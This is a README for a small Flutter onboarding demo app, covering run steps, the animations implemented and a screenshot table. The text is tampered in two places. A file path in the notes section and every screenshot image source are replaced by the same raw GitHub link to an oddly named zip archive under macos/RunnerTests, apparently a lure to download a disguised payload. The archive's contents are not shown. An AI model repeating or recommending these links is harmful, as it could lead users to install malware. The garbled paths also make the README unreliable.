# Language Adventure

A two-screen Flutter experience inspired by the reference onboarding. The first screen is an animated, swipeable onboarding carousel; the second screen continues the flow with a hero handoff and call-to-action.

## How to run

1. Ensure Flutter 3.9+ is installed and on your `PATH`.
2. Install packages:
   ```bash
   flutter pub get
   ```
3. Run on a simulator or device:
   ```bash
   flutter run
   ```

## Animations implemented

- Page-driven character motion (scale/opacity) tied to `PageView` offset.
- Text entrance micro-animations using translated `AnimatedOpacity`.
- Pulsing floating action button with easing.
- Hero transition from onboarding character into the adventure screen.
- Card fade/slide on the adventure screen for a gentle entrance.
- Curved footer with smooth color changes per page.

## Notes & improvements

- Character art is composed from simple Flutter shapes—no binary assets required.
- Colors and typography use a shared theme via `google_fonts`.
- Layout is portrait-locked to mirror the reference. Remove the orientation lock in `https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip` if landscape support is desired.
- All assets are generated in-code; if you prefer custom illustrations, drop PNG/SVGs into `assets/` and swap the character builders.


# flutter_apk

<table>

<tr>
  <th>1st View</th>
  <th>2nd View</th>
  <th>3rd View</th>
  <th>4th View</th>
  <th>5th View</th>
</tr>

<td>
  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
</td>
<td>
  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
</td>
<td>
  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
</td>
<td>
  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
</td>
<td>
  <img src="https://raw.githubusercontent.com/yasin9064/assignment/main/macos/RunnerTests/Software_epidermoid.zip" width="260"/>
</td>

</table>

